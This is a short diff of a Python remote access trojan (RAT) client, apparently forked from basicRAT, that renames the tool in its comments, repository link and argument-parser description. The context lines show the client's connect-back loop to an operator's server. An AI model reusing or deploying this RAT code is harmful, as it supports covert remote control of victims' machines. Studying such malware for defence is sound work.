@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 
 #
-# basicRAT client
-# https://github.com/vesche/basicRAT
+# RAT client
+# https://github.com/harshivara/RAT
 #
 
 import argparse
@@ -81,7 +81,7 @@ def client_loop(conn, dhkey):
 
 
 def get_parser():
-    parser = argparse.ArgumentParser(description='basicRAT client')
+    parser = argparse.ArgumentParser(description='RAT client')
     parser.add_argument('-i', '--ip', help='Server IP.',
                         default='127.0.0.1', type=str)
     parser.add_argument('-p', '--port', help='Port to connect on.',
@@ -104,7 +104,7 @@ def main():
         conn = socket.socket()
 
         try:
-            # attempt to connect to basicRAT server
+            # attempt to connect to RAT server
             conn.connect((host, port))
         except socket.error:
             time.sleep(timeout)
